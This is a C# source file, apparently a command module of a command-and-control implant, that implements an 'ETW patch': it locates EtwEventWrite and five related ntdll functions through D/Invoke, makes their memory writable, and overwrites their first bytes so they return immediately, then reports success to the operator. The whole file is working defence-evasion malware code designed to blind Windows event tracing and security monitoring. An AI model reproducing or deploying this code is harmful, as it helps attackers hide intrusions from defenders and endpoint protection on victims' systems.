using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Patch_ETW : EngineerCommand
    {
        public override string Name => "patch_Etw";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (IntPtr.Size == 8)
                {
                    byte[] patch = { 0x33, 0xC0, 0xC3 };
                    Patch(patch,task);
                }
                else
                {
                    byte[] patch = { 0x33, 0xC0, 0xC3 };
                    Patch(patch,task);
                }



                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("ETW Patched with D/Invoke",task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
                var error = "error: " + "[!] {patch failed}" + e.Message;
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(error, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }

        private static void Patch(byte[] patch, EngineerTask task)
        {
            List<string> Modulelist = new List<string>() 
            {
            "EtwEventWrite",
            "EtwEventWriteEndScenario",
            "EtwEventWriteEx",
            "EtwEventWriteFull",
            "EtwEventWriteTransfer",
            "EtwWriteUMSecurityEvent"
            };
            
            foreach (string module in Modulelist)
            {
                try
                {
                    //get the address of the function
                    IntPtr ModuleBase = DynInv.GetPebLdrModuleEntry("ntdll.dll");
                    IntPtr functionAddress = DynInv.GetExportAddress(ModuleBase, module);

                    //make the address writable, I wanted to use getSyscallStub but with NtAllocateVirtualMemory and NtPtotect being called from a maped version of the dll, its kind of pointless to use the syscall stub.
                    uint oldProtect = h_DynInv_Methods.NtFuncWrapper.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, patch.Length, (uint)h_DynInv.Win32.Kernel32.MemoryProtection.ReadWrite);

                    // Patch function
                    Marshal.Copy(patch, 0, functionAddress, patch.Length);
                    
                    // Restore memory permissions
                    uint newProtect = new uint();
                    h_DynInv_Methods.NtFuncWrapper.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, patch.Length, oldProtect);
                }
                catch (Exception e)
                {

                    //Console.WriteLine(e.Message);
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                }
               
            }
        }

    }
}
